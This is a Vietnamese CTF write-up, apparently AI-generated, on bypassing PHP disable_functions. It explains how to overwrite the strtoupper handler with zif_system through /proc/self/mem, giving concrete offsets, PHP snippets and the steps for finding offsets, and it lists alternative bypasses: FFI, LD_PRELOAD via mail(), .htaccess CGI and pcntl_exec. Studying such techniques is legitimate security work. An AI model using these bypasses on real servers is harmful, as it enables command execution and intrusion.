mong CLB tha thứ 💔

```Slop

1. Vì sao cần mem patch?
Sau khi upload PHAR và dùng LFI phar://..., mình có PHP code execution (eval), nhưng các hàm chạy lệnh bị chặn:
system, exec, shell_exec, passthru, popen, proc_open, backtick...
Trong PHP, mỗi hàm nội bộ (internal function) là một struct zend_internal_function. Struct này có một con trỏ tới hàm C thật, gọi là handler:
struct _zend_internal_function {
    ...
    zif_handler handler;   // ví dụ: zif_strtoupper, zif_system
    ...
};
disable_functions sẽ vô hiệu hóa các hàm bị liệt kê. Nhưng strtoupper không bị disable, nên entry của nó vẫn còn trong EG(function_table), và handler của nó vẫn trỏ tới zif_strtoupper.
Ý tưởng:
Ghi đè handler của strtoupper bằng địa chỉ zif_system.
Sau đó gọi strtoupper("id") → thực chất chạy system("id").
Đây là kỹ thuật PHP disable_functions bypass bằng /proc/self/mem, không phải mình phát minh ra. Mình chỉ chỉnh offset cho đúng bản libphp.so của target.
2. Từng bước mem patch hoạt động
Bước 1: Tìm base của libphp.so
libphp.so là shared library, được ASLR map vào địa chỉ ngẫu nhiên. Đọc /proc/self/maps:
foreach (file('/proc/self/maps') as $l) {
    if (strpos($l, 'libphp.so') !== false &&
        preg_match('/^([0-9a-f]+)-[0-9a-f]+ .... 00000000 /', $l, $m)) {
        $b = hexdec($m[1]);
    }
}
Dòng có file offset 00000000 là mapping đầu tiên → $b là base.
Bước 2: Mở /proc/self/mem
$m = fopen('/proc/self/mem', 'r+b');
/proc/self/mem cho phép đọc/ghi bộ nhớ của chính process. Linux dùng FOLL_FORCE khi ghi, nên có thể ghi đè cả trang .text đang ở quyền r-xp mà không cần mprotect.
Bước 3: Lấy EG(function_table)
Trong Zend Engine:
- executor_globals là biến global, trên target nằm ở $b + 0xE6C200.
- Trong struct đó, function_table nằm ở offset 0x1B0 (432).
$eg = $b + 0xE6C200;
$ft = uu($eg + 0x1B0, 8);   // EG(function_table)
$ft là con trỏ tới HashTable chứa toàn bộ function.
Bước 4: Tìm entry của strtoupper
HashTable trong PHP 8.1:
- arData ở +0x10
- nNumUsed ở +0x18
- nTableSize ở +0x20
- mỗi Bucket 32 byte
- trong Bucket: key ở +0x18, value ở +0x00
Script duyệt từng bucket, đọc zend_string của key, so sánh với "strtoupper":
$fp = gfn($ft, 'strtoupper');   // zend_function* của strtoupper
Bước 5: Ghi đè handler
Trên PHP 8.1, NTS, x86_64:
- zif_system nằm ở $b + 0x347E90
- trong zend_internal_function, handler ở offset 0x38 (56)
$sys = $b + 0x347E90;        // zif_system
ww($fp + 0x38, pack('P', $sys));
Chỉ cần một lần ghi 8 byte.
Bước 6: Gọi hàm
$cmd = 'id > /tmp/x.out 2>&1; chmod 644 /tmp/x.out';
strtoupper($cmd);            // thực chất là system($cmd)
echo file_get_contents('/tmp/x.out');
Vì system() có prototype (string $command, &$return_var = null), còn strtoupper() truyền một string — đủ để zif_system parse và chạy. Kiểu trả về khác nhau không quan trọng.
Đó là toàn bộ “mem patch”.
3. Mình đã tìm các offset đó bằng cách nào?
Quy trình thực tế:
4. Xác định PHP build
- Dùng phpinfo() / ?info hoặc header X-Powered-By.
- Target là Ubuntu 22.04, Apache + libphp.so, PHP 8.1, NTS, x86_64.
2. Lấy đúng file libphp.so
- Có thể đọc từ target qua LFI (?f=/usr/lib/apache2/modules/libphp.so) rồi base64 về.
- Hoặc tải đúng package Ubuntu cùng version.
3. Tìm executor_globals
- nm -D libphp.so | grep executor_globals
- hoặc readelf -sW, objdump -T, gdb -q libphp.so -ex 'info address executor_globals'.
- Ra offset 0xE6C200.
4. Tìm zif_system
- Nếu file còn symbol: nm -a libphp.so | grep zif_system.
- Nếu stripped: dùng package debug symbol (-dbgsym), hoặc gdb/objdump để tìm hàm theo pattern (nó gọi php_exec/VCWD_POPEN).
- Ra offset 0x347E90.
5. Tính offset struct
- function_table trong zend_executor_globals: đọc header PHP 8.1 hoặc viết một extension nhỏ dùng offsetof → 0x1B0.
- handler trong zend_internal_function: từ Zend/zend_compile.h → 0x38.
- Layout HashTable/Bucket: từ Zend/zend_hash.h / zend_types.h.
6. Kiểm tra an toàn
- Hàm fti() kiểm tra arData, nNumUsed, nTableSize có hợp lý không.
- Nếu offset sai, script không ghi và trả về lỗi thay vì crash cả Apache worker.
Vì vậy, “bí mật” chỉ là: đúng build + đúng offset struct. Nếu đổi PHP version, các offset này phải tính lại.
4. Có cách nào đơn giản hơn không?
Tùy mục tiêu:
A. Nếu chỉ cần chạy lệnh với quyền www-data
Có vài cách, xếp từ đơn giản đến phức tạp:
5. FFI (nếu bật)
$f = FFI::cdef("int system(const char *cmd);");
$f->system("id");
Đơn giản nhất, nhưng web SAPI thường để ffi.enable=preload → không dùng được.
6. mail() + putenv() + LD_PRELOAD (chankro)
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@b.c", "x", "y");
evil.so có __attribute__((constructor)) chạy lệnh. Không cần offset, nhưng phụ thuộc mail, putenv, sendmail. Trong thư mục hiện tại đã có evil2.so / evil2.c — đây chính là hướng này.
7. .htaccess + CGI
Nếu thư mục upload cho phép AllowOverride và Options +ExecCGI:
Options +ExecCGI
AddHandler cgi-script .cgi
Upload một file .cgi:
#!/bin/sh
echo Content-Type: text/plain
echo
id
Apache chạy trực tiếp file đó bằng quyền www-data, bỏ qua hoàn toàn disable_functions. Đây là cách “sạch” nhất nếu cấu hình cho phép.
8. Hàm khác chưa bị disable
Kiểm tra get_defined_functions() và ini_get('disable_functions'):
- pcntl_exec
- imap_open (CVE cũ, thường đã patch)
- ssh2_exec
- expect_popen
- mb_send_mail
- mail
Nếu có pcntl_exec, chỉ cần:
pcntl_exec('/bin/sh', ['-c', 'id']);
5. Mem patch (cách đang dùng)
Không phụ thuộc extension nào, chỉ cần /proc/self/mem + /proc/self/maps. Nhược điểm: phải biết offset của đúng build.
B. Nếu mục tiêu là đọc /root/flag.txt
Không có cách PHP nào đơn giản hơn, vì:
- www-data không đọc được /root.
- /readflag là setuid root nhưng bị NoNewPrivs=1 vô hiệu hóa setuid.
- Trong container không có root process, không có cron, không có SUID lạ, không có docker socket.
- Vì vậy vẫn cần privilege escalation (kernel exploit hoặc container escape). Mem patch chỉ là bước “có shell www-data”; nó không thay thế kernel exploit.
5. Tóm lại
- Mem patch = sửa handler của strtoupper trong libphp.so thành zif_system, dùng /proc/self/mem.
- Nó tìm ra bằng cách: xác định PHP build → lấy libphp.so → tra symbol/offset → đọc layout struct PHP 8.1.
- Nó không phải kernel exploit và không vượt NoNewPrivs.
- Cách đơn giản hơn để có shell www-data: FFI, mail+LD_PRELOAD, .htaccess+CGI, hoặc hàm exec khác chưa bị disable — tùy cấu hình target.
- Nếu muốn mình viết lại runner mem patch cho dễ đọc hơn, hoặc thử một hướng thay thế (FFI/mail/.htaccess), bạn cần chuyển sang agent Build; mình đang ở Plan mode nên chỉ giải thích và lên phương án, không sửa file.
```